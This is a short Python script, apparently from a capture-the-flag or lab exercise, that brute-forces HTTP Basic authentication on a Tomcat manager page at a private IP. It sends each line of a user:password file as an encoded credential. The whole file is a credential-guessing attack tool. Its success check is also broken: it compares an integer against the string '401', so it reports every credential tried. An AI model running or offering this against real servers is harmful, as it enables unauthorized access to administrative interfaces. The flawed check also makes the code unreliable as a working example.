import requests
import base64

url = "https://10.10.10.128:8180/manager/html"

f=open("user_password.txt","r")

for crds in f:
    #print(crds.strip())
    encoded = base64.b64encode(crds.encode())
    #print(encoded.decode())
    headers = {"Authorization":"Basic "+encoded.decode()}
    response = requests.get(url,headers=headers)
    print(response.status_code)
    if int(response.status_code) != "401":
        print(crds.strip())
